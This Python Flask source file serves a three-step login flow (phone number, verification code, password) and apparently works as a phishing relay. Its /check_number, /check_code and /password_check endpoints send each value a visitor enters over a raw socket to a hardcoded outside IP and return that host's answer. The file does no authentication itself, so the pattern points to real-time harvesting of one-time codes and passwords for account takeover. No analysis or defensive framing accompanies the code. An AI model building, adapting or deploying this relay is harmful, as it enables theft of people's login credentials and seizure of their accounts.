from flask import Flask, render_template, request
import socket

app = Flask(__name__)

Sessions = {}
host = "193.124.65.30"
port = 50000


@app.route('/')
def index():
    request_username = request.args.get('username')
    request_phone = request.args.get('phone')
    if request_username and request_username != '' and request_phone and request_phone != '':
        return render_template("number/number.html", username=request_username, phone=request_phone)
    if request_username and request_username != '':
        return render_template("number/number.html", username=request_username, phone="")
    else:
        return render_template("bad_request.html")


@app.route('/code')
def code():
    request_username = request.args.get('username')
    request_phone = request.args.get('phone')
    if request_username and request_username != '' and request_phone and request_phone != '':
        return render_template("code/code.html", phone="+" + request_phone, username=request_username)
    else:
        return render_template("bad_request.html")


@app.route('/password')
def password():
    request_username = request.args.get('username')
    if request_username and request_username != '':
        return render_template("password/password.html", username=request_username)
    else:
        return render_template("bad_request.html")


@app.route('/check_number/<jsdata>')
def send_code(jsdata):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception as e:
        print(e)
        return '0'
    else:
        s.sendall(('check_number\r' + jsdata).encode('utf-8'))
        data = str(s.recv(1024)).strip("b'")
        return data


@app.route('/check_code/<jsdata>')
def check_code(jsdata):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception as e:
        print(e)
        return '0'
    else:
        s.sendall(('check_code\r' + jsdata).encode('utf-8'))
        data = str(s.recv(1024)).strip("b'")
        print("check_code", data)
        return data


@app.route('/password_check/<jsdata>')
def password_check(jsdata):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
    except Exception as e:
        print(e)
        return '0'
    else:
        s.sendall(('password_check\r' + jsdata).encode('utf-8'))
        data = str(s.recv(1024)).strip("b'")
        return data


if __name__ == "__main__":
    app.run()
